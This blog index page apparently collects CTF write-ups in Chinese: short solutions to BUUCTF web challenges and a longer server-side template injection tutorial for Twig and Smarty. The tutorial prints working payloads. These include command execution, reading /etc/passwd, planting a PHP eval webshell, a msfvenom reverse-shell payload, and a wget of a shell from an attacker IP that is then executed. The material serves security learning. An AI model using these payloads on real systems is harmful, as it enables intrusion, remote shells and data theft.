<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="why">
<meta property="og:url" content="http://example.com/page/9/index.html">
<meta property="og:site_name" content="why">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="why">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/9/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/9/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>why</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">why</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">疯疯癫癫的小辣鸡</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">why</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">118</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" class="post-title-link" itemprop="url">[WUSTCTF2020]朴实无华</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-14 16:26:17 / 修改时间：16:59:14" itemprop="dateCreated datePublished" datetime="2024-05-14T16:26:17+08:00">2024-05-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>先扫描文件，发现robots.txt</p>
<p>之后发现</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164746970.png" alt="image-20240514164746970"></p>
<p>抓包访问</p>
<p>发现</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164317787.png" alt="image-20240514164317787"></p>
<p>前往发现代码</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164708798.png" alt="image-20240514164708798"></p>
<p>level1：</p>
<p>num&lt;2020 num+1&gt;2021</p>
<p>怎么说，因为intval，所以15e10&#x3D;15</p>
<p>但是15e10+1就是15e10+1代表的值</p>
<p>所以传这个就行</p>
<p>level2：</p>
<p>$md5&#x3D;&#x3D;md5($md5)</p>
<p>但是是弱比较，所以就是说0exxxxxx&#x3D;0exxxxxxxx</p>
<p>找到一个0e开头且md5值0e开头的就行</p>
<p>level3：</p>
<p>system(get_flag)</p>
<p>先传个ls上去，这里是过滤了cat和空格</p>
<p>找到</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514165826395.png" alt="image-20240514165826395"></p>
<p>所以就是绕过空格和cat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Mark-loves-cat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Mark-loves-cat/" class="post-title-link" itemprop="url">[BJDCTF2020]Mark loves cat</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-14 15:29:38 / 修改时间：16:00:16" itemprop="dateCreated datePublished" datetime="2024-05-14T15:29:38+08:00">2024-05-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153039668.png" alt="image-20240514153039668"></p>
<p>emm就是，怎么说，查看源代码没什么用</p>
<p>所以扫文件发现后台的git文件</p>
<p>再进行githack，下载下载下来了文件</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153143827.png" alt="image-20240514153143827"></p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153255877.png" alt="image-20240514153255877"></p>
<p>发现了这个！！！</p>
<p>所以我们要想办法，把$handsome之类的改为flag</p>
<p>最简单的就是在get里面yds&#x3D;flag</p>
<p>拿到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/ssti/ssti/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/13/ssti/ssti/" class="post-title-link" itemprop="url">ssti</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-05-13 21:44:48" itemprop="dateCreated datePublished" datetime="2024-05-13T21:44:48+08:00">2024-05-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-05-15 21:35:13" itemprop="dateModified" datetime="2024-05-15T21:35:13+08:00">2024-05-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>php常见的模板：twig，smarty，blade</p>
<p>  <em>1Twig</em></p>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;\twig\lib\Twig\Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p>
<p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png" alt="img"></a></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig=newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png" alt="img"></a></p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>
<p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
<p>例如这里用户输入name&#x3D;20 ，则在服务端拼接的模版内容为:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png" alt="img"></a></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>实际服务端要进行编译的模板就被构造为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK </p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png" alt="img"></a></p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png" alt="img"></a></p>
<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png" alt="img"></a></p>
<blockquote>
<p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 双括号 的处理方式</p>
<p>在这里提供一个针对twig的攻击载荷：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png" alt="img"></a></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt</span><br></pre></td></tr></table></figure>

<p>msf进行监听：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png" alt="img"></a></p>
<p>模板注入远程下载shell，并重命名运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png" alt="img"></a></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>　　　　　　　　　　 《<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p>
<p>*<strong>2*</strong>|***2***<strong>Smarty</strong></p>
<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png" alt="img"></a></p>
<p>因此我们可以用这个方法读文件，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>同样</p>
<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     */</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            $old_umask = umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        // if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         * Windows&#x27; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#x27; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#x27; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         */</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            // remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                // remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                // rename tmp file</span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            // set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname = null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们可以构造payload写个webshell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<p><strong>CTF实例讲解</strong></p>
<p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png" alt="img"></a></p>
<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png" alt="img"></a></p>
<p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png" alt="img"></a></p>
<p><strong>Smarty-SSTI常规利用方式：</strong></p>
<p><strong>1. {$smarty.version}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png" alt="img"></a></p>
<p><strong>2. {php}{&#x2F;php}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>

<p>Smarty支持使用 {php}{&#x2F;php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png" alt="img"></a></p>
